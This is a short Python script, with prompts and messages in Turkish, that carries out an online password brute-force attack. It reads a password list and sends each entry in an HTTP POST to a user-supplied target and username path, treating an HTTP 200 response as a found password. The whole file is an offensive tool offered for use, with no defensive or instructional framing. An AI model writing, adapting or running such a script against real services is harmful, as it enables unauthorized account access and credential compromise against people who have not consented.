import time
import requests

def bruteforce(target, username, password_file):
    with open(password_file) as f:
        passwords = f.readlines()

    for password in passwords:
        password = password.strip()

        start_time = time.time()
        response = requests.post(f"http://{target}/{username}", data={"password": password})
        end_time = time.time()

        if response.status_code == 200:
            print(f"Şifre bulundu: {password}")
            print(f"Süre: {end_time - start_time} saniye")
            return

    print("Şifre bulunamadı.")


if __name__ == "__main__":
    target = input("Hedef: ")
    username = input("Kullanıcı adı: ")
    password_file = input("Şifre dosyası: ")

    bruteforce(target, username, password_file)
